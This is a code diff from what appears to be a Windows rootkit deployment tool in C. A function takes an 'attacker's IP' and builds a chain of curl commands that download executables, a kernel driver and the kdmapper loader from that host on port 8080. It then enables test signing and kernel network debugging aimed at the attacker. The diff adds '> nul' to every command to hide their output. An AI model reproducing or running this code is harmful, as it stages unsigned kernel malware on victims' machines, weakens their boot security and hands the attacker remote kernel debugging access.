@@ -6,11 +6,11 @@ BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char
 		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
 		return FALSE;
 	}
-	if (system("taskkill /F /IM MainMedium.exe") == -1) {
+	if (system("taskkill /F /IM MainMedium.exe > nul") == -1) {
 		printf("[-] Failed execution of initial termination command of MainMedium.exe - %d\n", GetLastError());
 		return FALSE;
 	}
-	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder") == -1) {
+	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder > nul") == -1) {
 		printf("[-] Failed execution of initial deleting command of nosusfolder - %d\n", GetLastError());
 		return FALSE;
 	}
@@ -19,30 +19,30 @@ BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char
 	const char* SymbolsArr = "~`\'";
 	const int TotalCommands = 23;
 	const char* FileCommands[TotalCommands] = {
-		"cd C:\\ && ",
-		"mkdir nosusfolder\\verysus\\MainMedium\\x64\\Release && ",
-		"curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln && ",
-		"curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp && ",
-		"curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h && ",
-		"curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp && ",
-		"curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h && ",
-		"curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp && ",
-		"curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h && ",
-		"curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp && ",
-		"curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h && "
-		"curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj && ",
-		"curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters && ",
-		"curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user && ",
-		"curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe && ",
-	    "mkdir nosusfolder\\verysus\\KMDFdriver\\Release && ",
-		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys && ",
-		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf && ",
-		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb && ",
-		"curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe && ",	
-		"curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe && ",
-		"bcdedit /set TESTSIGNING ON && ",
-		"bcdedit /set DEBUG ON && ",
-		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\'" };
+		"cd C:\\ > nul && ",
+		"mkdir nosusfolder\\verysus\\MainMedium\\x64\\Release > nul && ",
+		"curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln > nul && ",
+		"curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp > nul && ",
+		"curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h > nul && ",
+		"curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp > nul && ",
+		"curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h > nul && ",
+		"curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp > nul && ",
+		"curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h > nul && ",
+		"curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp > nul && ",
+		"curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h > nul && "
+		"curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj > nul && ",
+		"curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters > nul && ",
+		"curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user > nul && ",
+		"curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe > nul && ",
+	    "mkdir nosusfolder\\verysus\\KMDFdriver\\Release > nul && ",
+		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys > nul && ",
+		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf > nul && ",
+		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb > nul && ",
+		"curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe > nul && ",	
+		"curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe > nul && ",
+		"bcdedit /set TESTSIGNING ON > nul && ",
+		"bcdedit /set DEBUG ON > nul && ",
+		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\' > nul" };
 
 	return PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 3);
 }
@@ -53,7 +53,7 @@ BOOL SignAsService(char* ServicePath, RootService* ServiceObject, const char* Se
 	DWORD ServiceSize = 0;
 	PVOID ServiceBuffer = NULL;
 	DWORD ServiceRead = 0;
-	const char* RemoveExBase = "sc stop ~ && sc delete ~";
+	const char* RemoveExBase = "sc stop ~ > nul && sc delete ~ > nul ";
 	char RemoveExisting[MAX_PATH] = { 0 };
 	int ri = 0;
 
